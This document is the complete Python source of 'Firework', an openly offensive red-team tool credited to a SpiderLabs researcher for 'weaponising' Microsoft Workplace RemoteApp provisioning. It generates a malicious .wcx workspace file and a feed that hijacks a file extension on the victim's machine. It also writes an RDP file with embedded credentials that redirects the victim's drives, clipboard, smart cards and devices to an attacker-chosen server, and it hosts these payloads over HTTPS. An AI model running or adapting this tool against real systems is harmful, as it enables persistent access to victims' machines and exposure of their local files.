#!/usr/bin/env python
# Firework - Weaponising Microsoft Workplace (Remote App) provisioning
# David Middlehurst @dtmsecurity, SpiderLabs - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.


import base64
from colorama import Fore, Back, Style
import uuid
from server import *
import os
import argparse

def banner():
    banner = "Li06Ojo6Oic6Ojo6Ojo6Ojo6Li4gIC4sOjo6Ojo6Ljo6ICAgIC4gICAuOjo6ICAuLi4gICAgOjo6Ojo6Oi4uICAgIDo6OiAgLiAgIAo7OzsnJycnIDs7Ozs7OztgYDs7OzsgOzs7OycnJycnOzssICA7OyAgOzs7Jy47Ozs7Ozs7LiA7Ozs7YGA7Ozs7ICAgOzs7IC47OywuCltbWywsPT0gW1tbIFtbWywvW1tbJyAgW1tjY2NjICAnW1ssIFtbLCBbWycsW1sgICAgIFxbWyxbW1ssL1tbWycgICBbW1tbWy8nICAKYCQkJCJgYCAkJCQgJCQkJCQkYyAgICAkJCIiIiIgICAgWSRjJCQkYyRQICQkJCwgICAgICQkJCQkJCQkJGMgICAgXyQkJCQsICAgIAogODg4ICAgIDg4OCA4ODhiICI4OGJvLDg4OG9vLF9fICAgIjg4Ijg4OCAgIjg4OCxfIF8sODhQODg4YiAiODhibywiODg4Ijg4bywgCiAiTU0sICAgTU1NIE1NTU0gICAiVyIgIiIiIllVTU1NICAgIk0gIk0iICAgICJZTU1NTU1QIiBNTU1NICAgIlciICBNTU0gIk1NUCIK"
    print("")
    print(Fore.GREEN + base64.b64decode(banner).decode('utf8'))
    print(Style.RESET_ALL)


class Firework:
    def __init__(self):
        self.hostedFiles = dict()
        self.company = "Secure App"
        self.feedUrl = "https://example.org/"
        self.wcx = ""
        self.apps = []
        self.feed = ""
        self.domain = "domain"
        self.username = "administrator"
        self.password = "01000000D08C9DDF0115D1118C7A00C04FC297EB010000000DB88E9C2974C24FA234CC2EC7D4E8BE00000000080000007000730077000000106600000001000020000000CBCD31921BDC991973C2127EED86EF467994D90311A8158C413147C5550DE9A8000000000E8000000002000020000000F8E18317CEC0F970F3531BD913CAB91BFFCD9BD3D8DFC26999EA21AA46D20CDD2000000047A7E071B141B3973667E70696E2A203D3400E54C88C9A866E4BE4D44C1B5D49400000007BC7BC835F2B6C2318D6662C63FE9955D1B282CBF4B84591258E1A5B4C199306F999D492226222F1A4B63ABFAA20C7877C8B2850BC9E88C14A6297D5C4C67EC9"
        self.server = "192.168.1.1"
        self.rdp = ""

    def generateWcx(self):
        self.wcx = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?>\n"
        self.wcx += "<workspace name=\"%s Remote Access\" xmlns=\"http://schemas.microsoft.com/ts/2008/09/tswcx\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n" % (self.company)
        self.wcx += "<defaultFeed url=\"%s\" />\n" % (self.feedUrl)
        self.wcx += "</workspace>\n"

    def addApp(self,appName,executableName,fileExtension,iconFile):
        appGuid = str(uuid.uuid4())

        iconPath = "/%s.ico" % (appGuid)

        fh = open(iconFile,"rb")
        self.hostedFiles[iconPath] = base64.b64encode(fh.read())
        fh.close()

        rdpPath = "/%s.rdp" % (appGuid)
        rdpContent = self.rdp
        self.hostedFiles[rdpPath] = rdpContent

        newApp = "<Resource ID=\"%s\" Alias=\"%s\" Title=\"%s\" LastUpdated=\"2009-07-09T17:57:12.588625Z\" Type=\"RemoteApp\" ExecutableName=\"%s\">\n" % (appGuid,appName,appName,executableName)
        newApp += "<Icons>\n<IconRaw FileType=\"ico\" FileURL=\"%s\" />\n</Icons>\n" % (iconPath)
        newApp += "<FileExtensions>\n"
        newApp += "<FileExtension Name=\"%s\" />\n" % (fileExtension)
        newApp += "</FileExtensions>\n"
        newApp += "<HostingTerminalServers>\n"
        newApp += "<HostingTerminalServer>\n"
        newApp += "<ResourceFile FileExtension=\".rdp\" URL=\"%s\" />\n" % (rdpPath)
        newApp += "<TerminalServerRef Ref=\"Contoso\" />\n"
        newApp += "</HostingTerminalServer>\n"
        newApp += "</HostingTerminalServers>\n"
        newApp += "</Resource>\n"
        self.apps.append(newApp)

    def generateFeed(self):
        self.feed = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
        self.feed += "<ResourceCollection PubDate=\"2009-07-09T17:57:30.323Z\" SchemaVersion=\"1.1\" xmlns=\"http://schemas.microsoft.com/ts/2007/05/tswf\">\n"
        self.feed += "<Publisher LastUpdated=\"2009-07-09T17:57:12.588625Z\" Name=\"%s\" ID=\"Contoso\" Description=\"\">\n" % (self.company)
        self.feed += "<Resources>\n"
        for app in self.apps:
            self.feed += app
        self.feed += "</Resources>\n"
        self.feed += "<TerminalServers>\n"
        self.feed += "<TerminalServer ID=\"Contoso\" Name=\"Contoso\" LastUpdated=\"2009-07-09T17:57:12.588625Z\" />\n"
        self.feed += "</TerminalServers>\n"
        self.feed += "</Publisher>\n</ResourceCollection>\n"
        self.hostedFiles["/"] = self.feed

    def generateRdp(self):
        self.rdp += "screen mode id:i:2\r\n"
        self.rdp += "use multimon:i:1\r\n"
        self.rdp += "desktopwidth:i:800\r\n"
        self.rdp += "desktopheight:i:600\r\n"
        self.rdp += "session bpp:i:32\r\n"
        self.rdp += "winposstr:s:0,3,0,0,800,600\r\n"
        self.rdp += "compression:i:1\r\n"
        self.rdp += "keyboardhook:i:2\r\n"
        self.rdp += "audiocapturemode:i:0\r\n"
        self.rdp += "videoplaybackmode:i:1\r\n"
        self.rdp += "connection type:i:7\r\n"
        self.rdp += "networkautodetect:i:1\r\n"
        self.rdp += "bandwidthautodetect:i:1\r\n"
        self.rdp += "displayconnectionbar:i:1\r\n"
        self.rdp += "domain:s:%s\r\n" % (self.domain)
        self.rdp += "username:s:%s\r\n" % (self.username)
        self.rdp += "password 51:b:%s\r\n" % (self.password)
        self.rdp += "enableworkspacereconnect:i:0\r\n"
        self.rdp += "disable wallpaper:i:0\r\n"
        self.rdp += "allow font smoothing:i:0\r\n"
        self.rdp += "allow desktop composition:i:0\r\n"
        self.rdp += "disable full window drag:i:1\r\n"
        self.rdp += "disable menu anims:i:1\r\n"
        self.rdp += "disable themes:i:0\r\n"
        self.rdp += "disable cursor setting:i:0\r\n"
        self.rdp += "bitmapcachepersistenable:i:1\r\n"
        self.rdp += "full address:s:%s\r\n" % (self.server)
        self.rdp += "audiomode:i:0\r\n"
        self.rdp += "redirectprinters:i:1\r\n"
        self.rdp += "redirectcomports:i:1\r\n"
        self.rdp += "redirectsmartcards:i:1\r\n"
        self.rdp += "redirectclipboard:i:1\r\n"
        self.rdp += "redirectposdevices:i:0\r\n"
        self.rdp += "camerastoredirect:s:*\r\n"
        self.rdp += "devicestoredirect:s:*\r\n"
        self.rdp += "drivestoredirect:s:*\r\n"
        self.rdp += "autoreconnection enabled:i:1\r\n"
        self.rdp += "authentication level:i:1\r\n"
        self.rdp += "prompt for credentials:i:0\r\n"
        self.rdp += "prompt for credentials on client:i:0\r\n"
        self.rdp += "negotiate security layer:i:1\r\n"
        self.rdp += "remoteapplicationmode:i:0\r\n"
        self.rdp += "alternate shell:s:\r\n"
        self.rdp += "shell working directory:s:\r\n"
        self.rdp += "gatewayhostname:s:\r\n"
        self.rdp += "gatewayusagemethod:i:4\r\n"
        self.rdp += "gatewaycredentialssource:i:4\r\n"
        self.rdp += "gatewayprofileusagemethod:i:0\r\n"
        self.rdp += "promptcredentialonce:i:1\r\n"
        self.rdp += "gatewaybrokeringtype:i:0\r\n"
        self.rdp += "use redirection server name:i:0\r\n"
        self.rdp += "rdgiskdcproxy:i:0\r\n"
        self.rdp += "kdcproxyname:s:\r\n"

def main():
    banner()

    parser = argparse.ArgumentParser(description='WCX workplace tool')
    parser.add_argument('-c','--company', help='Company name', required=True)
    parser.add_argument('-u','--url', help='Feed URL', required=True)
    parser.add_argument('-a','--app', help='App Name', required=True)
    parser.add_argument('-e','--ext', help='App Extension', required=True)
    parser.add_argument('-i','--icon', help='App Icon', required=True)
    parser.add_argument('-l','--listen', help='TLS Web Server Port')
    parser.add_argument('-r','--rdp', help='RDP Server')
    parser.add_argument('-d','--domain', help='RDP Domain')
    parser.add_argument('-n','--username', help='RDP Username')
    parser.add_argument('-p','--password', help='RDP Password')
    parser.add_argument('-t','--cert', help='SSL cert')
    parser.add_argument('-k','--key', help='SSL key')
    args = parser.parse_args()

    f = Firework()

    if args.company is not None:
        f.company = str(args.company)
    if args.url is not None:
        f.feedUrl = str(args.url)
    if args.rdp is not None:
        f.server = str(args.rdp)
    if args.domain is not None:
        f.domain = str(args.domain)
    if args.username is not None:
        f.username = str(args.username)
    if args.password is not None:
        f.password = str(args.password)

    f.generateWcx()

    fh = open("payload.wcx","w")
    fh.write(f.wcx)
    fh.close()
    print(Fore.GREEN + "Written: " + Style.RESET_ALL + "payload.wcx")

    f.generateRdp()


    f.addApp(str(args.app),"%s.exe" % str(args.app), str(args.ext), str(args.icon))
    #f.addApp("Word","word.exe",".doc","./excel.ico")
    f.generateFeed()

    fh = open("feed.xml","w")
    fh.write(f.feed)
    fh.close()

    print(Fore.GREEN + "Written: " + Style.RESET_ALL + "feed.xml")

    hosted = f.hostedFiles

    if args.listen is not None:
        port = int(args.listen)
    else:
        port = 443

    cert = "cert.crt"
    key = "key.pem"

    if args.cert is not None:
        cert = str(args.cert)
    if args.key is not None:
        key = str(args.key)

    if os.path.isfile(cert) and os.path.isfile(key):
        print(Fore.GREEN + "Starting server: " + Style.RESET_ALL + "https://0.0.0.0/")
        serve_thread_SSL('', port, HTTPS, hosted, cert, key, )
    else:
        print(Fore.RED + "Failed to start server: " + Style.RESET_ALL + ("'%s' and '%s' not present - Writing resources to disk instead" % (cert,key)))
        for file in hosted:
            if file != "/":
                print(Fore.GREEN + "Written: " + Style.RESET_ALL + file)
                fh = open(os.path.join(os.getcwd(),".%s" % file),"w")
                fh.write(hosted[file])
                fh.close()

if __name__ == '__main__':
    main()


